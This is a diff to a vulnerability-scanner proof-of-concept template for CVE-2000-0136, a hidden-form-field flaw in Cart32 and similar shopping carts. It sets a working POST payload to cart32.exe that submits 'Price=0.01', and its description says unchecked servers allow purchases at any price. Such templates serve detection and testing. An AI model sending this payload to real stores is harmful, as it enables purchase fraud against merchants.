@@ -1,8 +1,8 @@
 [info]
 author = "AVE"
-description = "检测 Cart32 等多款购物车应用隐藏表单字段篡改漏洞，通过修改 HTTP POST 请求中价格等隐藏字段值验证服务器是否信任客户端提交的敏感数据"
+description = "通过 HTTP POST 请求发送篡改后的隐藏表单字段参数（如修改 Price 值），验证目标购物车程序是否在服务端校验商品价格等隐藏字段。若服务端未校验，攻击者可实现任意价格购买。参考 ExploitDB 19951 实际利用代码。"
 id = "POC-AVE-2000-0406"
-name = "Cart32/QuickCommerce/Shop Express/StoreCreator Hidden Form Field Tampering PoC"
+name = "Cart32 / QuickCommerce 等多款购物车程序隐藏表单字段漏洞 PoC"
 severity = "high"
 tags = ["cve-2000-0136"]
 vuln_id = [
@@ -15,24 +15,24 @@ logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cart32.exe"
+path = "/{{BaseURL}}/cgi-bin/cart32.exe/justsocks-AddItem"
 protocol = "http"
 
 [poc.requests.body]
-content = "item=1&quantity=1&price=0.01&hidden_price=0.01"
+content = "Price=0.01&Item=Test+Item&PartNo=F6092&Qty=1&p1=XL&t1=d-Size%3BS%3BM%3BL%3BXL&p2=Black&t2=d-Color%3BBlack%3BWhite"
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
-User-Agent = "AVE/1.0"
+Referer = "{{BaseURL}}"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "order",
-    "total",
-    "receipt",
-    "checkout",
+    "Thank you",
+    "Order",
+    "Confirmation",
+    "successfully",
 ]
